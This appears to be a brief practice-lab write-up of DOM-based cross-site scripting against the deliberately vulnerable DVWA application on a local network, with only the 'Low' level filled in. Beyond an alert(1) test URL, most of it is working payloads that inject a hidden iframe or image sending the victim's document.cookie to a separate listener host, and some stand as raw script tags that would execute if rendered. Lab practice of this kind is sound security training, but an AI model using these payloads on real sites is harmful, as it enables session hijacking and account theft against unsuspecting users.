# DOM Based Cross Site Scripting (XSS)

#### Low

When we click the `Select` button the url changes to:

```
http://192.168.0.11/vulnerabilities/xss_d/?default=English
```

```
http://192.168.0.11/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E
```

<script type="text/javascript">document.write("<iframe sytle='display: none;' src='http://192.168.0.10:8000/?cookie="+document.cookie+"'></iframe>");</script>

<script>document.write("<iframe sytle='display: none;' src='http://192.168.0.10:8000/?cookie="+document.cookie+"'></iframe>");</script>

<iframe src='http://192.168.0.10:8000/?cookie=document.cookie'></iframe>
<img src='http://192.168.0.10:8000/?cookie=document.cookie'></img>

#### Medium

#### High

